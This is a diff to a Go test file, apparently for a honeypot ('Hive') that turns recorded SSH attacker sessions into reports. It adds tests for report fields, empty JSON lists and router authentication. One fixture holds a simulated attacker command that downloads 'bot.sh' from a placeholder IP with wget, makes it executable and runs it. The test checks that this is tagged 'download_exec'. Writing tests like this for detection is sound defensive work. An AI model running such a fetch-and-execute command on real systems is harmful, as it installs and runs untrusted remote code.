@@ -106,7 +106,7 @@ func TestBuildReport(t *testing.T) {
 		Data: json.RawMessage(`{"url":"http://203.0.113.9/bot.sh","sha256":"` + strings.Repeat("a", 64) + `","failed":false}`)}
 	evs := []*Event{
 		{TS: time.Now(), Type: "connect", Service: "ssh", SrcIP: ip, DstPort: 22, Session: "s1"}, login,
-		cmdEv(ip, "s1", "uname -a"),
+		cmdEv(ip, "s1", "<b>x</b> uname -a 2>&1"), // darf keine "Dateien" liefern
 		cmdEv(ip, "s1", "cd /tmp; wget http://203.0.113.9/bot.sh -O b.sh; chmod +x b.sh; ./b.sh"), dl,
 	}
 	r := BuildReport("IP "+ip, evs, false)
@@ -116,7 +116,7 @@ func TestBuildReport(t *testing.T) {
 	if len(r.Tags) < 2 || r.Tags[0].ID != "download_exec" {
 		t.Fatalf("Muster: %+v", r.Tags)
 	}
-	if len(r.URLs) != 1 || r.URLs[0] != "http://203.0.113.9/bot.sh" || len(r.Hashes) != 1 || !contains(r.Files, "b.sh") {
+	if len(r.URLs) != 1 || r.URLs[0] != "http://203.0.113.9/bot.sh" || len(r.Hashes) != 1 || len(r.Files) != 1 || r.Files[0] != "b.sh" {
 		t.Fatalf("Spuren: urls=%v hashes=%v files=%v", r.URLs, r.Hashes, r.Files)
 	}
 	txt := r.Text()
@@ -125,8 +125,13 @@ func TestBuildReport(t *testing.T) {
 			t.Errorf("%q fehlt im Berichtstext:\n%s", want, txt)
 		}
 	}
-	if e := BuildReport("leer", nil, false); e.Severity != "niedrig" || len(e.Summary) != 1 {
+	e := BuildReport("leer", nil, false)
+	if e.Severity != "niedrig" || len(e.Summary) != 1 {
 		t.Fatalf("leerer Bericht: %+v", e)
+	}
+	// Die UI ruft .length auf jeder Liste auf: im JSON darf kein null stehen.
+	if b, _ := json.Marshal(e); strings.Contains(string(b), "null") {
+		t.Fatalf("leere Listen müssen [] sein: %s", b)
 	}
 }
 
@@ -440,5 +445,35 @@ func TestMigrationCreatesLookups(t *testing.T) {
 	st.db.QueryRow(`SELECT COUNT(*) FROM lookups`).Scan(&n)
 	if n != 0 {
 		t.Fatal("Aufbewahrung löscht alte Einträge nicht")
+	}
+}
+
+// ---------- Router ----------
+
+// In 0.2.0 stürzte der Hive ohne HIVE_SENSOR_LISTEN beim Start ab (Routen-Konflikt).
+func TestRoutesBothModes(t *testing.T) {
+	h := testHive(t)
+	h.auth = NewAuth(h.st, "tok", false)
+	for _, onUI := range []bool{false, true} {
+		ui, sensor := h.routes(onUI, "metrik", http.NotFoundHandler())
+		req := httptest.NewRequest("POST", "/api/sensor/heartbeat", strings.NewReader(`{"sensor":"x"}`))
+		req.Header.Set("Authorization", "Bearer tok")
+		rec := httptest.NewRecorder()
+		sensor.ServeHTTP(rec, req)
+		if rec.Code != 200 {
+			t.Fatalf("Sensor-Router: %d", rec.Code)
+		}
+		req = httptest.NewRequest("POST", "/api/ingest", strings.NewReader(`{"events":[]}`))
+		req.Header.Set("Authorization", "Bearer tok")
+		rec = httptest.NewRecorder()
+		ui.ServeHTTP(rec, req)
+		if want := map[bool]int{true: 200, false: 405}[onUI]; rec.Code != want {
+			t.Fatalf("UI-Router (sensorOnUI=%v): %d, erwartet %d", onUI, rec.Code, want)
+		}
+		rec = httptest.NewRecorder()
+		ui.ServeHTTP(rec, httptest.NewRequest("GET", "/api/extras", nil))
+		if rec.Code != 401 {
+			t.Fatalf("geschützte Route ohne Anmeldung: %d", rec.Code)
+		}
 	}
 }
